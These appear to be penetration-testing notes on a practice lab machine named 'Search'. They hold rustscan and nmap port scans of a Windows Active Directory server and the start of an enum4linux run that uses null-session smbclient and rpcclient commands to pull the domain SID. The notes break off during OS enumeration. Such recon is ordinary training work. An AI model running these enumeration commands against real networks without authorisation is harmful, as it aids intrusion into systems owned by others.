Search IP:


rustscan:

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
443/tcp   open  https            syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
8172/tcp  open  unknown          syn-ack
9389/tcp  open  adws             syn-ack
49667/tcp open  unknown          syn-ack
49675/tcp open  unknown          syn-ack
49676/tcp open  unknown          syn-ack
49701/tcp open  unknown          syn-ack
49712/tcp open  unknown          syn-ack


nmap:


PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Search &mdash; Just Testing IIS
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2023-04-14 09:46:21Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Issuer: commonName=search-RESEARCH-CA/domainComponent=search
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-08-11T08:13:35
| Not valid after:  2030-08-09T08:13:35
| MD5:   0738 614f 7bc0 29d0 6d1d 9ea6 3cdb d99e
| SHA-1: 10ae 5494 29d6 1e44 276f b8a2 24ca fde9 de93 af78
| -----BEGIN CERTIFICATE-----
| MIIFZzCCBE+gAwIBAgITVAAAABRx/RXdaDt/5wAAAAAAFDANBgkqhkiG9w0BAQsF
| ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VhcmNo
| MRswGQYDVQQDExJzZWFyY2gtUkVTRUFSQ0gtQ0EwHhcNMjAwODExMDgxMzM1WhcN
| MzAwODA5MDgxMzM1WjAxMRwwGgYDVQQDExNyZXNlYXJjaC5zZWFyY2guaHRiMREw
| DwYDVQQDEwhyZXNlYXJjaDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| AJryZQO0w3Fil8haWl73Hh2HNnwxC3RxcPGE3QrXLglc2zwp1AsHLAKhUOuAq/Js
| OMyVBQZo13cmRh8l7XOcSXUI4YV/ezXr7GbznlN9NTGooZkzYuMBa21afqTjBgPk
| VYByyfYcECv8TvKI7uc78TpkwpZfmAKi6ha/7o8A1rCSipDvp5wtChLsDK9bsEfl
| nlQbMR8SBQFrWWjXIvCGH2KNkOI56Xz9HV9F2JGwJZNWrHml7BuK18g9sMs0/p7G
| BZxaQLW18zOQnKt3lNo97ovV7A2JljEkknR4MckN4tAEDmOFLvTcdAQ6Y3THvvcr
| UMg24FrX1i8J5WKfjjRdhvkCAwEAAaOCAl0wggJZMDwGCSsGAQQBgjcVBwQvMC0G
| JSsGAQQBgjcVCIqrSYT8vHWlnxuHg8xchZLMMYFpgcOKV4GUuG0CAWQCAQUwEwYD
| VR0lBAwwCgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMBsGCSsGAQQBgjcVCgQO
| MAwwCgYIKwYBBQUHAwEwHQYDVR0OBBYEFFX1E0g3TlBigM7mdF25TuT8fM/dMB8G
| A1UdIwQYMBaAFGqRrXsob7VIpls4zrxiql/nV+xQMIHQBgNVHR8EgcgwgcUwgcKg
| gb+ggbyGgblsZGFwOi8vL0NOPXNlYXJjaC1SRVNFQVJDSC1DQSxDTj1SZXNlYXJj
| aCxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMs
| Q049Q29uZmlndXJhdGlvbixEQz1zZWFyY2gsREM9aHRiP2NlcnRpZmljYXRlUmV2
| b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu
| dDCBwwYIKwYBBQUHAQEEgbYwgbMwgbAGCCsGAQUFBzAChoGjbGRhcDovLy9DTj1z
| ZWFyY2gtUkVTRUFSQ0gtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VhcmNoLERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAOkRDrr85ypJJcgefRXJMcVduM0xK
| JT1TzlSgPMw6koXP0a8uR+nLM6dUyU8jfwy5nZDz1SGoOo3X42MTAr6gFomNCj3a
| FgVpTZq90yqTNJEJF9KosUDd47hsBPhw2uu0f4k0UQa/b/+C0Zh5PlBWeoYLSru+
| JcPAWC1o0tQ3MKGogFIGuXYcGcdysM1U+Ho5exQDMTKEiMbSvP9WV52tEnjAvmEe
| 7/lPqiPHGIs7mRW/zXRMq7yDulWUdzAcxZxYzqHQ4k5bQnuVkGEw0d1dcFsoGEKj
| 7pdPzYPnCzHLoO/BDAKJvOrYfI4BPNn2JDBs46CkUwygpiJpL7zIYvCUDQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2023-04-14T09:47:50+00:00; 0s from scanner time.
443/tcp   open  ssl/http      syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Search &mdash; Just Testing IIS
| ssl-cert: Subject: commonName=research
| Issuer: commonName=search-RESEARCH-CA/domainComponent=search
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-08-11T08:13:35
| Not valid after:  2030-08-09T08:13:35
| MD5:   0738 614f 7bc0 29d0 6d1d 9ea6 3cdb d99e
| SHA-1: 10ae 5494 29d6 1e44 276f b8a2 24ca fde9 de93 af78
| -----BEGIN CERTIFICATE-----
| MIIFZzCCBE+gAwIBAgITVAAAABRx/RXdaDt/5wAAAAAAFDANBgkqhkiG9w0BAQsF
| ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VhcmNo
| MRswGQYDVQQDExJzZWFyY2gtUkVTRUFSQ0gtQ0EwHhcNMjAwODExMDgxMzM1WhcN
| MzAwODA5MDgxMzM1WjAxMRwwGgYDVQQDExNyZXNlYXJjaC5zZWFyY2guaHRiMREw
| DwYDVQQDEwhyZXNlYXJjaDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| AJryZQO0w3Fil8haWl73Hh2HNnwxC3RxcPGE3QrXLglc2zwp1AsHLAKhUOuAq/Js
| OMyVBQZo13cmRh8l7XOcSXUI4YV/ezXr7GbznlN9NTGooZkzYuMBa21afqTjBgPk
| VYByyfYcECv8TvKI7uc78TpkwpZfmAKi6ha/7o8A1rCSipDvp5wtChLsDK9bsEfl
| nlQbMR8SBQFrWWjXIvCGH2KNkOI56Xz9HV9F2JGwJZNWrHml7BuK18g9sMs0/p7G
| BZxaQLW18zOQnKt3lNo97ovV7A2JljEkknR4MckN4tAEDmOFLvTcdAQ6Y3THvvcr
| UMg24FrX1i8J5WKfjjRdhvkCAwEAAaOCAl0wggJZMDwGCSsGAQQBgjcVBwQvMC0G
| JSsGAQQBgjcVCIqrSYT8vHWlnxuHg8xchZLMMYFpgcOKV4GUuG0CAWQCAQUwEwYD
| VR0lBAwwCgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMBsGCSsGAQQBgjcVCgQO
| MAwwCgYIKwYBBQUHAwEwHQYDVR0OBBYEFFX1E0g3TlBigM7mdF25TuT8fM/dMB8G
| A1UdIwQYMBaAFGqRrXsob7VIpls4zrxiql/nV+xQMIHQBgNVHR8EgcgwgcUwgcKg
| gb+ggbyGgblsZGFwOi8vL0NOPXNlYXJjaC1SRVNFQVJDSC1DQSxDTj1SZXNlYXJj
| aCxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMs
| Q049Q29uZmlndXJhdGlvbixEQz1zZWFyY2gsREM9aHRiP2NlcnRpZmljYXRlUmV2
| b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu
| dDCBwwYIKwYBBQUHAQEEgbYwgbMwgbAGCCsGAQUFBzAChoGjbGRhcDovLy9DTj1z
| ZWFyY2gtUkVTRUFSQ0gtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VhcmNoLERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAOkRDrr85ypJJcgefRXJMcVduM0xK
| JT1TzlSgPMw6koXP0a8uR+nLM6dUyU8jfwy5nZDz1SGoOo3X42MTAr6gFomNCj3a
| FgVpTZq90yqTNJEJF9KosUDd47hsBPhw2uu0f4k0UQa/b/+C0Zh5PlBWeoYLSru+
| JcPAWC1o0tQ3MKGogFIGuXYcGcdysM1U+Ho5exQDMTKEiMbSvP9WV52tEnjAvmEe
| 7/lPqiPHGIs7mRW/zXRMq7yDulWUdzAcxZxYzqHQ4k5bQnuVkGEw0d1dcFsoGEKj
| 7pdPzYPnCzHLoO/BDAKJvOrYfI4BPNn2JDBs46CkUwygpiJpL7zIYvCUDQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2023-04-14T09:47:50+00:00; 0s from scanner time.
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Issuer: commonName=search-RESEARCH-CA/domainComponent=search
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-08-11T08:13:35
| Not valid after:  2030-08-09T08:13:35
| MD5:   0738 614f 7bc0 29d0 6d1d 9ea6 3cdb d99e
| SHA-1: 10ae 5494 29d6 1e44 276f b8a2 24ca fde9 de93 af78
| -----BEGIN CERTIFICATE-----
| MIIFZzCCBE+gAwIBAgITVAAAABRx/RXdaDt/5wAAAAAAFDANBgkqhkiG9w0BAQsF
| ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VhcmNo
| MRswGQYDVQQDExJzZWFyY2gtUkVTRUFSQ0gtQ0EwHhcNMjAwODExMDgxMzM1WhcN
| MzAwODA5MDgxMzM1WjAxMRwwGgYDVQQDExNyZXNlYXJjaC5zZWFyY2guaHRiMREw
| DwYDVQQDEwhyZXNlYXJjaDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| AJryZQO0w3Fil8haWl73Hh2HNnwxC3RxcPGE3QrXLglc2zwp1AsHLAKhUOuAq/Js
| OMyVBQZo13cmRh8l7XOcSXUI4YV/ezXr7GbznlN9NTGooZkzYuMBa21afqTjBgPk
| VYByyfYcECv8TvKI7uc78TpkwpZfmAKi6ha/7o8A1rCSipDvp5wtChLsDK9bsEfl
| nlQbMR8SBQFrWWjXIvCGH2KNkOI56Xz9HV9F2JGwJZNWrHml7BuK18g9sMs0/p7G
| BZxaQLW18zOQnKt3lNo97ovV7A2JljEkknR4MckN4tAEDmOFLvTcdAQ6Y3THvvcr
| UMg24FrX1i8J5WKfjjRdhvkCAwEAAaOCAl0wggJZMDwGCSsGAQQBgjcVBwQvMC0G
| JSsGAQQBgjcVCIqrSYT8vHWlnxuHg8xchZLMMYFpgcOKV4GUuG0CAWQCAQUwEwYD
| VR0lBAwwCgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMBsGCSsGAQQBgjcVCgQO
| MAwwCgYIKwYBBQUHAwEwHQYDVR0OBBYEFFX1E0g3TlBigM7mdF25TuT8fM/dMB8G
| A1UdIwQYMBaAFGqRrXsob7VIpls4zrxiql/nV+xQMIHQBgNVHR8EgcgwgcUwgcKg
| gb+ggbyGgblsZGFwOi8vL0NOPXNlYXJjaC1SRVNFQVJDSC1DQSxDTj1SZXNlYXJj
| aCxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMs
| Q049Q29uZmlndXJhdGlvbixEQz1zZWFyY2gsREM9aHRiP2NlcnRpZmljYXRlUmV2
| b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu
| dDCBwwYIKwYBBQUHAQEEgbYwgbMwgbAGCCsGAQUFBzAChoGjbGRhcDovLy9DTj1z
| ZWFyY2gtUkVTRUFSQ0gtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VhcmNoLERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAOkRDrr85ypJJcgefRXJMcVduM0xK
| JT1TzlSgPMw6koXP0a8uR+nLM6dUyU8jfwy5nZDz1SGoOo3X42MTAr6gFomNCj3a
| FgVpTZq90yqTNJEJF9KosUDd47hsBPhw2uu0f4k0UQa/b/+C0Zh5PlBWeoYLSru+
| JcPAWC1o0tQ3MKGogFIGuXYcGcdysM1U+Ho5exQDMTKEiMbSvP9WV52tEnjAvmEe
| 7/lPqiPHGIs7mRW/zXRMq7yDulWUdzAcxZxYzqHQ4k5bQnuVkGEw0d1dcFsoGEKj
| 7pdPzYPnCzHLoO/BDAKJvOrYfI4BPNn2JDBs46CkUwygpiJpL7zIYvCUDQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2023-04-14T09:47:50+00:00; 0s from scanner time.
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Issuer: commonName=search-RESEARCH-CA/domainComponent=search
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-08-11T08:13:35
| Not valid after:  2030-08-09T08:13:35
| MD5:   0738 614f 7bc0 29d0 6d1d 9ea6 3cdb d99e
| SHA-1: 10ae 5494 29d6 1e44 276f b8a2 24ca fde9 de93 af78
| -----BEGIN CERTIFICATE-----
| MIIFZzCCBE+gAwIBAgITVAAAABRx/RXdaDt/5wAAAAAAFDANBgkqhkiG9w0BAQsF
| ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VhcmNo
| MRswGQYDVQQDExJzZWFyY2gtUkVTRUFSQ0gtQ0EwHhcNMjAwODExMDgxMzM1WhcN
| MzAwODA5MDgxMzM1WjAxMRwwGgYDVQQDExNyZXNlYXJjaC5zZWFyY2guaHRiMREw
| DwYDVQQDEwhyZXNlYXJjaDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| AJryZQO0w3Fil8haWl73Hh2HNnwxC3RxcPGE3QrXLglc2zwp1AsHLAKhUOuAq/Js
| OMyVBQZo13cmRh8l7XOcSXUI4YV/ezXr7GbznlN9NTGooZkzYuMBa21afqTjBgPk
| VYByyfYcECv8TvKI7uc78TpkwpZfmAKi6ha/7o8A1rCSipDvp5wtChLsDK9bsEfl
| nlQbMR8SBQFrWWjXIvCGH2KNkOI56Xz9HV9F2JGwJZNWrHml7BuK18g9sMs0/p7G
| BZxaQLW18zOQnKt3lNo97ovV7A2JljEkknR4MckN4tAEDmOFLvTcdAQ6Y3THvvcr
| UMg24FrX1i8J5WKfjjRdhvkCAwEAAaOCAl0wggJZMDwGCSsGAQQBgjcVBwQvMC0G
| JSsGAQQBgjcVCIqrSYT8vHWlnxuHg8xchZLMMYFpgcOKV4GUuG0CAWQCAQUwEwYD
| VR0lBAwwCgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMBsGCSsGAQQBgjcVCgQO
| MAwwCgYIKwYBBQUHAwEwHQYDVR0OBBYEFFX1E0g3TlBigM7mdF25TuT8fM/dMB8G
| A1UdIwQYMBaAFGqRrXsob7VIpls4zrxiql/nV+xQMIHQBgNVHR8EgcgwgcUwgcKg
| gb+ggbyGgblsZGFwOi8vL0NOPXNlYXJjaC1SRVNFQVJDSC1DQSxDTj1SZXNlYXJj
| aCxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMs
| Q049Q29uZmlndXJhdGlvbixEQz1zZWFyY2gsREM9aHRiP2NlcnRpZmljYXRlUmV2
| b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu
| dDCBwwYIKwYBBQUHAQEEgbYwgbMwgbAGCCsGAQUFBzAChoGjbGRhcDovLy9DTj1z
| ZWFyY2gtUkVTRUFSQ0gtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VhcmNoLERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAOkRDrr85ypJJcgefRXJMcVduM0xK
| JT1TzlSgPMw6koXP0a8uR+nLM6dUyU8jfwy5nZDz1SGoOo3X42MTAr6gFomNCj3a
| FgVpTZq90yqTNJEJF9KosUDd47hsBPhw2uu0f4k0UQa/b/+C0Zh5PlBWeoYLSru+
| JcPAWC1o0tQ3MKGogFIGuXYcGcdysM1U+Ho5exQDMTKEiMbSvP9WV52tEnjAvmEe
| 7/lPqiPHGIs7mRW/zXRMq7yDulWUdzAcxZxYzqHQ4k5bQnuVkGEw0d1dcFsoGEKj
| 7pdPzYPnCzHLoO/BDAKJvOrYfI4BPNn2JDBs46CkUwygpiJpL7zIYvCUDQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2023-04-14T09:47:50+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Issuer: commonName=search-RESEARCH-CA/domainComponent=search
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-08-11T08:13:35
| Not valid after:  2030-08-09T08:13:35
| MD5:   0738 614f 7bc0 29d0 6d1d 9ea6 3cdb d99e
| SHA-1: 10ae 5494 29d6 1e44 276f b8a2 24ca fde9 de93 af78
| -----BEGIN CERTIFICATE-----
| MIIFZzCCBE+gAwIBAgITVAAAABRx/RXdaDt/5wAAAAAAFDANBgkqhkiG9w0BAQsF
| ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VhcmNo
| MRswGQYDVQQDExJzZWFyY2gtUkVTRUFSQ0gtQ0EwHhcNMjAwODExMDgxMzM1WhcN
| MzAwODA5MDgxMzM1WjAxMRwwGgYDVQQDExNyZXNlYXJjaC5zZWFyY2guaHRiMREw
| DwYDVQQDEwhyZXNlYXJjaDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| AJryZQO0w3Fil8haWl73Hh2HNnwxC3RxcPGE3QrXLglc2zwp1AsHLAKhUOuAq/Js
| OMyVBQZo13cmRh8l7XOcSXUI4YV/ezXr7GbznlN9NTGooZkzYuMBa21afqTjBgPk
| VYByyfYcECv8TvKI7uc78TpkwpZfmAKi6ha/7o8A1rCSipDvp5wtChLsDK9bsEfl
| nlQbMR8SBQFrWWjXIvCGH2KNkOI56Xz9HV9F2JGwJZNWrHml7BuK18g9sMs0/p7G
| BZxaQLW18zOQnKt3lNo97ovV7A2JljEkknR4MckN4tAEDmOFLvTcdAQ6Y3THvvcr
| UMg24FrX1i8J5WKfjjRdhvkCAwEAAaOCAl0wggJZMDwGCSsGAQQBgjcVBwQvMC0G
| JSsGAQQBgjcVCIqrSYT8vHWlnxuHg8xchZLMMYFpgcOKV4GUuG0CAWQCAQUwEwYD
| VR0lBAwwCgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMBsGCSsGAQQBgjcVCgQO
| MAwwCgYIKwYBBQUHAwEwHQYDVR0OBBYEFFX1E0g3TlBigM7mdF25TuT8fM/dMB8G
| A1UdIwQYMBaAFGqRrXsob7VIpls4zrxiql/nV+xQMIHQBgNVHR8EgcgwgcUwgcKg
| gb+ggbyGgblsZGFwOi8vL0NOPXNlYXJjaC1SRVNFQVJDSC1DQSxDTj1SZXNlYXJj
| aCxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMs
| Q049Q29uZmlndXJhdGlvbixEQz1zZWFyY2gsREM9aHRiP2NlcnRpZmljYXRlUmV2
| b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu
| dDCBwwYIKwYBBQUHAQEEgbYwgbMwgbAGCCsGAQUFBzAChoGjbGRhcDovLy9DTj1z
| ZWFyY2gtUkVTRUFSQ0gtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VhcmNoLERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAOkRDrr85ypJJcgefRXJMcVduM0xK
| JT1TzlSgPMw6koXP0a8uR+nLM6dUyU8jfwy5nZDz1SGoOo3X42MTAr6gFomNCj3a
| FgVpTZq90yqTNJEJF9KosUDd47hsBPhw2uu0f4k0UQa/b/+C0Zh5PlBWeoYLSru+
| JcPAWC1o0tQ3MKGogFIGuXYcGcdysM1U+Ho5exQDMTKEiMbSvP9WV52tEnjAvmEe
| 7/lPqiPHGIs7mRW/zXRMq7yDulWUdzAcxZxYzqHQ4k5bQnuVkGEw0d1dcFsoGEKj
| 7pdPzYPnCzHLoO/BDAKJvOrYfI4BPNn2JDBs46CkUwygpiJpL7zIYvCUDQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2023-04-14T09:47:50+00:00; 0s from scanner time.
8172/tcp  open  ssl/http      syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
| Issuer: commonName=WMSvc-SHA2-RESEARCH
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-04-07T09:05:25
| Not valid after:  2030-04-05T09:05:25
| MD5:   eeb9 303e 6d46 bd8b 34a0 1ed6 0eb8 3287
| SHA-1: 1e06 9fd0 ef45 b051 78b2 c6bf 1bed 975e a87d 0458
| -----BEGIN CERTIFICATE-----
| MIIC7TCCAdWgAwIBAgIQcJlfxrPWrqJOzFjgO04PijANBgkqhkiG9w0BAQsFADAe
| MRwwGgYDVQQDExNXTVN2Yy1TSEEyLVJFU0VBUkNIMB4XDTIwMDQwNzA5MDUyNVoX
| DTMwMDQwNTA5MDUyNVowHjEcMBoGA1UEAxMTV01TdmMtU0hBMi1SRVNFQVJDSDCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALXrSYHlRsq+HX01zrmC6Ddi
| /+vL/iDzS9endY3CRjfTjBL85qwvU5dkS+cxYTIkDaK5M9eoLcaVSARIcyrGIGuq
| DwIFQuYuaoGeQgiaQCqU5vXgsZ/xE8DRmlnZ2DeiAcHhx72TOHoUoUP4q2EqRoVr
| q5RCBGITT7hdRQd0vuTIHoLxdO2U5wZVCoN5vsp0Du43/LCgXExUpcHAHu9aVAzt
| pXWFY8B3XEFZjafffOHXiK6C2UzX4DddYweKR+ItMfQzX8T2MbX1qVm7D526/gU9
| WRGa7F/tj8+qvzZc4SQZ6Td9PWpMKCPGqqYTGmHlEW8ZowGoMSH62QaCilFxckEC
| AwEAAaMnMCUwEwYDVR0lBAwwCgYIKwYBBQUHAwEwDgYDVR0PBAcDBQCwAAAAMA0G
| CSqGSIb3DQEBCwUAA4IBAQAlGUrh9gLK7Er/BzEjyWebPPf18m3XxgZ13iFllhJ0
| 5tBUb3hczHIr3VOj/OWUJygxw8O10OrBZJZf29TPZ2nXKGbJRpYe+baii49LsGjr
| DiOM5XVZv5qiPBNts7fKyhpzTy0DdnIKAXUIYy/7nQ6rHetXApz89ZEzU6vAN0g0
| Zxq/NolqIVnehFn/36tjc65v1wgo6KnHAQUt6zWufueeYS3k2f4JzvFn4aPtUYRi
| nQgTuGbJTlxdVJ5DJjld9pLyJ+OctGeI1jRITiYlu5p3JwhxU0+mQjGT5mQZ+Umu
| abMpffugMOPYnyHu8poRZWjKgNBN0ygmnqGbTjx57No5
|_-----END CERTIFICATE-----
|_ssl-date: 2023-04-14T09:47:50+00:00; 0s from scanner time.
| tls-alpn: 
|_  http/1.1
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49675/tcp open  msrpc         syn-ack Microsoft Windows RPC
49676/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49701/tcp open  msrpc         syn-ack Microsoft Windows RPC
49712/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 32134/tcp): CLEAN (Timeout)
|   Check 2 (port 32408/tcp): CLEAN (Timeout)
|   Check 3 (port 18790/udp): CLEAN (Timeout)
|   Check 4 (port 48802/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-04-14T09:47:15
|_  start_date: N/A





enum4linux:

enum4linux -v 10.10.11.129
[V] Dependent program "nmblookup" found in /usr/bin/nmblookup
[V] Dependent program "net" found in /usr/bin/net
[V] Dependent program "rpcclient" found in /usr/bin/rpcclient
[V] Dependent program "smbclient" found in /usr/bin/smbclient
[V] Dependent program "polenum" found in /usr/bin/polenum
[V] Dependent program "ldapsearch" found in /usr/bin/ldapsearch
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Apr 14 05:46:17 2023

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.11.129
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.11.129    |
 ==================================================== 
[V] Attempting to get domain name with command: nmblookup -A '10.10.11.129'
[E] Can't find workgroup/domain


 ============================================ 
|    Nbtstat Information for 10.10.11.129    |
 ============================================ 
Looking up status of 10.10.11.129
No reply from 10.10.11.129

 ===================================== 
|    Session Check on 10.10.11.129    |
 ===================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[V] Attempting to make null session using command: smbclient -W '' //'10.10.11.129'/ipc$ -U''%'' -c 'help' 2>&1
[+] Server 10.10.11.129 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 =========================================== 
|    Getting domain SID for 10.10.11.129    |
 =========================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
[V] Attempting to get domain SID with command: rpcclient -W '' -U''%'' 10.10.11.129 -c 'lsaquery' 2>&1
Domain Name: SEARCH
Domain Sid: S-1-5-21-271492789-1610487937-1871574529
[+] Host is part of a domain (not a workgroup)

 ====================================== 
|    OS information on 10.10.11.129    |
 ====================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
[V] Attempting to get OS info with command: smbclient -W '' //'10.10.11.129'/ipc$ -U''%'' -c 'q' 2>&1
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.11.129 from smbclient: 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[V] Attempting to get OS info with command: rpcclient -W '' -U''%'' -c 'srvinfo' '10.10.11.129' 2>&1
[+] Got OS info for 10.10.11.129 from srvinfo:
